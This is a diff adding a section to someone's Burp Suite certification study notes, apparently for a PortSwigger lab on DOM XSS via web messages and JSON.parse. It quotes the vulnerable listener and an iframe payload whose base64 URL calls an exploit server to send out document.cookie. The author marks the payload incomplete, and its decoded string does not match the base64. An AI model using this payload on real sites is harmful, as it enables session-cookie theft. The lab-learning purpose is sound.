@@ -29,6 +29,57 @@ The acronym BSCP has nice simular ring like OSCP  :)
 
 # Foothold  
 
+
+## AddEventListener JSON.parse  
+
+>DOM XSS using web messages and JSON.parse  
+
+```JavaScript
+<script>
+                        window.addEventListener('message', function(e) {
+                            var img = document.createElement('img'), ACMEplayer = {element: img}, d;
+                            document.body.appendChild(img);
+                            try {
+                                d = JSON.parse(e.data);
+                            } catch(e) {
+                                return;
+                            }
+                            switch(d.type) {
+                                case "page-load":
+                                    ACMEplayer.element.scrollIntoView();
+                                    break;
+                                case "load-channel":
+                                    ACMEplayer.element.src = d.url;
+                                    break;
+                                case "player-height-changed":
+                                    ACMEplayer.element.style.width = d.width + "px";
+                                    ACMEplayer.element.style.height = d.height + "px";
+                                    break;
+                                case "redirect":
+                                    window.location.replace(d.redirectUrl);
+                                    break;
+                            }
+                        }, false);
+                    </script>
+```
+
+> to exploit above code use below hosted exploit server iframe ----- faulty incomplete.....  
+
+>atob value decoded === http://exploit-0ac30095035c7526c09ebd7401a00075.exploit-server.net/bs.png/?bd=document.cookie  
+  
+  
+```html
+<iframe src=https://0ace001803c77527c0bdbe4c00050092.web-security-academy.net/ onload='this.contentWindow.postMessage(JSON.stringify({
+        type: "load-channel",
+        url:  atob("aHR0cDovL2V4cGxvaXQtMGFjMzAwOTUwMzVjNzUyNmMwOWViZDc0MDFhMDAwNzUuZXhwbG9pdC1zZXJ2ZXIubmV0Lz9iZD1kb2N1bWVudC5jb29raWU=")
+    }), "*");'>
+
+```  
+
+https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse
+
+
+
 ## Web Cache Poison  
 
 >Target use **tracking.js** JavaScript, and is vulnerable to **X-Forwarded-Host** header redirecting path, allowing the stealing of cookie by poisoning cache.
